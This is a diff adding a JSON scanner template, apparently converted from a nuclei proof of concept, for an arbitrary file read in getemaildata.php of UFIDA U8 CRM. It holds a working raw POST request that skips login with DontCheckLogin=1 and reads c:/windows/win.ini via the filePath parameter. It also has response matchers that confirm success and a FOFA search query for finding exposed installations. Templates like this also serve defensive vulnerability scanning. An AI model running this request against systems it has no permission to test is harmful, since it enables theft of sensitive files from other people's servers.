@@ -1,0 +1,118 @@
+{
+  "id": "yonyou-u8-crm-lfi",
+  "name": "UFIDA U8 CRM getemaildata.php - Arbitrary File Read",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "There is an arbitrary file reading vulnerability in getemaildata.php of UFIDA U8 CRM customer relationship management system. An attacker can obtain sensitive files in the server through the vulnerability.\n",
+  "references": [
+    "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20CRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20getemaildata.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "yonyou",
+    "u8-crm",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "body\u003d\"用友U8CRM\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /ajax/getemaildata.php?DontCheckLogin\u003d1\u0026filePath\u003dc:/windows/win.ini HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code_1 \u003d\u003d 200",
+            "contains(body_1,\"bit app support\") \u0026\u0026 contains(body_1,\"extensions\") \u0026\u0026 contains(body_1,\"fonts\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "yonyou-u8-crm-lfi",
+    "info": {
+      "name": "UFIDA U8 CRM getemaildata.php - Arbitrary File Read",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "There is an arbitrary file reading vulnerability in getemaildata.php of UFIDA U8 CRM customer relationship management system. An attacker can obtain sensitive files in the server through the vulnerability.\n",
+      "reference": [
+        "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20CRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20getemaildata.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "body\u003d\"用友U8CRM\""
+      },
+      "tags": "yonyou,u8-crm,lfi"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /ajax/getemaildata.php?DontCheckLogin\u003d1\u0026filePath\u003dc:/windows/win.ini HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code_1 \u003d\u003d 200",
+              "contains(body_1,\"bit app support\") \u0026\u0026 contains(body_1,\"extensions\") \u0026\u0026 contains(body_1,\"fonts\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
